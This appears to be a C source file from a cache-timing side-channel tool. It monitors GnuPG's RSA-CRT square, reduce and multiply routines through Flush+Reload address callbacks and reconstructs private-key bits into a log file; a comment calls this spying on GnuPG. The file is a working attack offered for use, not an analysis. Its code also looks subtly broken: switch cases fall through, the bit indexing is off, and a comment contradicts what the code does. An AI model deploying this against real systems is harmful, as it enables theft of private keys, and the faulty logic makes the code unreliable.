#include "rsacrt/rsacrt.h"

int rsacrt_cbk(FR* fr, void* addr) {

	rsacrt_data* data = (rsacrt_data*)fr->data;

	if( data->n_bits == N_BITS ) return 1;

	switch( data->n_bits_last_seq ) {

		case 0:
			if( addr == fr->addrs[RSACRT_S_IDX] )
				data->n_bits_last_seq++;
			else
				data->n_bits_last_seq=0;
		case 1:
			if( addr == fr->addrs[RSACRT_R_IDX] )
				data->n_bits_last_seq++;
			else
				data->n_bits_last_seq=0;
		case 2:
			if( addr == fr->addrs[RSACRT_M_IDX] ) {
				data->n_bits_last_seq++;
			}else{

				data->bits[data->n_bits] = '0';
				data->n_bits_last_seq=0;
				data->n_bits++;
			}

		case 3:
			if( addr == fr->addrs[RSACRT_R_IDX]) {
				data->bits[data->n_bits] = '1';
				data->n_bits_last_seq=0;
				data->n_bits++;
			}
			data->n_bits_last_seq = 0;
	}

	return 0;
}

uint8_t get_bit(short i){

	return 1 << i;
}

void rsacrt_monitor(FR* fr, const char* elf) {

	rsacrt_data data = {	
		.bits = {0},
		.n_bits = 0,
		.n_bits_last_seq = 0
	};

	// spy on gnuPG
	fr->data = &data;
	fr->cbk = rsacrt_cbk;
	fr_monitor_elf(fr, elf);

	// at this point, fr->data->bits has the N_BITS bits in text form
	// let's translate those to actual binary
	char binary[N_BITS/8]={0x00};

	for(unsigned int i=0; i < N_BITS; i+=8) {

		for(unsigned int j=0; j < 8; j++){

			if( data.bits[i + 8-j] == '1' ) binary[i/8] += get_bit(8-j);
		}
	}

	FILE* file = fopen("scripts/spy.log", "wb");
	// print binary data to terminal
	fwrite(binary, N_BITS/8, 1, file);
	fflush(file);
	fclose(file);
}
